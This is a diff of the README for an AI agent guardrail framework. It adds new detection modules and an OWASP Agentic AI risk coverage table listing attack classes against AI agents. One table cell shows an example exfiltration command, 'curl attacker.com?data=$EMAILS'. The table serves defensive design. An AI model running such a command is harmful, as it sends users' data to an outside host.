@@ -61,8 +61,11 @@ AgentGuard_NamoFans/
 │   │   │   ├── content_filters.py        # Azure Content Safety
 │   │   │   └── blocklist_manager.py      # Azure custom blocklists
 │   │   ├── l2_output/
+│   │   │   ├── groundedness_detector.py  # LLM-as-judge hallucination / relevance check
 │   │   │   ├── output_toxicity.py        # Output toxicity via Content Filters
 │   │   │   └── pii_detector.py           # Azure Text Analytics PII
+│   │   ├── l4_rbac.py                  # L4a ABAC engine (ALLOW / DENY / ELEVATE)
+│   │   ├── l4_behavioral.py            # L4b behavioral anomaly detector (5 signals)
 │   │   └── tool_firewall/
 │   │       ├── tool_specific_guards.py   # C3: 5 argument-aware guardrails
 │   │       ├── rule_evaluator.py         # Shared eval_condition() operator function
@@ -87,8 +90,8 @@ AgentGuard_NamoFans/
 │   ├── guarded_vulnerable_agent.py # vulnerable_agent wrapped with AgentGuard
 │   └── agentguard_vulnerable.yaml  # Config for the 82-tool vulnerable agent
 ├── writeup.md                      # Architecture & design decision log
-├── pyproject.toml                  # Project config (managed by uv)
-└── CLAUDE.md                       # Dev session guide
+├── PPT.md                          # 6-slide presentation deck (Microsoft UNLOCKED template)
+└── pyproject.toml                  # Project config (managed by uv)
 ```
 
 ---
@@ -147,6 +150,9 @@ agentguard test --config src/agentguard.yaml --module test_bots/financial_agent.
 | L2 Output: Toxicity | Azure AI Content Safety — Content Filters (reused) |
 | Tool Firewall C3 | Pure-Python rule-based guardrails (sqlparse, ipaddress, regex) |
 | Tool Firewall C1 | Azure AI Language — Named Entity Recognition on tool args |
+| L2 Output: Hallucination | LLM-as-judge groundedness check (3 strategies) |
+| L4 RBAC | Pure-Python ABAC engine — ALLOW / DENY / ELEVATE outcomes |
+| L4 Behavioral | 5-signal anomaly detector: Z-score, Levenshtein, read→exfil chain, domain, entropy |
 | Tool Firewall C2 | MELON contrastive embedding (OpenAI embeddings) |
 | Tool Firewall C4 | HITL (stdin prompt) / AITL (LLM auditor via TrueFoundry) |
 | Audit Log | SQLite (stdlib) — persistent decision log |
@@ -219,6 +225,25 @@ uv run pytest src/tests/ # run all unit tests
 uv run ruff check .      # lint
 uv run ruff format .     # format
 ```
+
+---
+
+## OWASP Agentic AI Top 10 — Coverage Map
+
+| OWASP Risk | Real CVE / Example | Primary Layer | Secondary Layer |
+|---|---|---|---|
+| AT-01 Prompt Injection | EchoLeak CVE-2025-32711 (CVSS 9.3) | L1 Tier 0–2 | L3 arg check |
+| AT-02 Excessive Agency | Agent writes/deletes beyond scope | L3 Tool Firewall | L4 RBAC DENY |
+| AT-03 Memory Poisoning | Adversarial PDF embeds override | L1 Spotlighting* | L3 content check |
+| AT-04 Insecure Tool Use | SQL DROP via injected query | L3 sql_query rule | L4 verb check |
+| AT-05 Resource Exhaustion | Runaway tool-call loops | L4 Behavioral Z-score | HITL ELEVATE |
+| AT-06 Data Exfiltration | curl attacker.com?data=$EMAILS | L3 http_* domain allowlist | L4 read→exfil chain |
+| AT-07 Privilege Escalation | Agent assumes admin role mid-session | L4 ABAC role lock | L4 cross-agent check |
+| AT-08 Supply Chain Attack | Malicious tool injected at runtime | L3 tool registry check | L4 RBAC deny |
+| AT-09 Hallucination Exploit | Fake tool result triggers bad action | L2 output filter | C2 MELON (opt-in) |
+| AT-10 Unsafe Coordination | Agent A commands Agent B improperly | L4 inter-agent RBAC | Guardian DAG check |
+
+> *AT-03 Spotlighting requires Azure AI Foundry endpoint — disabled in prototype; Tier-1 regex covers common patterns.
 
 ---
 
